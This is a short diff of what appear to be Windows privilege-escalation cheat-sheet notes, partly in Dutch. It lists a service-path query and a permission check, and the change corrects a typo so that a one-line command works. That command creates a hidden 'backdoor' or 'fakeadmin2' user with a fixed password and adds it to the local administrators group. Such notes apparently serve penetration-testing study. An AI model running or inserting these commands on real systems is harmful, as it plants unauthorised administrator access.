@@ -24,7 +24,7 @@ Get-WmiObject win32_service | select Name,PathName,StartMode,StartName | where {
 Add new user via Registry: 
 cmd.exe /c net user /add backdoor B@ckd00r123 && net localgroup administrators backdoor /add”
 
-cmd /c net user fakeadmin2 L3tm3!n /add && net localgroups administrators fakeadmin2 /add
+cmd /c net user fakeadmin2 L3tm3!n /add && net localgroup administrators fakeadmin2 /add
 
 Sysinternals check schrijfrechten:
 Accesschk -uwvqc “Everyone” *
